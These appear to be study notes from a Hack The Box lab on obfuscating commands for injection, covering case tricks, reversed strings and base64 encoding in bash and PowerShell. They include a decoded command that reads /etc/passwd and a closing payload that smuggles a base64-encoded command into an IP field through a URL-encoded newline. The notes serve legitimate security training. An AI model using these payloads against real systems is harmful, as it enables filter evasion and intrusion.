# Advanced Command Obfuscation

## Case Manipulation
Windows is <b>case insensitive</b>
```
PS C:\htb> WhOaMi

21y4d
```

Linux is <b>case sensitive</b>
```
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```
Specifically for bash:
```
$(a="WhOaMi";printf %s "${a,,}")
```

## Reversed Commands
#### Linux
```
farelmusyaffa@htb[/htb]$ echo 'whoami' | rev
imaohw
```
```
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```
#### Windows
```
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```
```
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

## Encoded Commands

#### Linux
Instead of copying an existing command, create our own unique obfuscation command by using `base64` (b64 encoding) or `xxd` (hex encoding).
```
farelmusyaffa@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```
```
farelmusyaffa@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```
#### Windows
```
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```
```
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```
Linux equivalent:
```
farelmusyaffa@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```
<br>

Exercise payload: <br>
`127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`
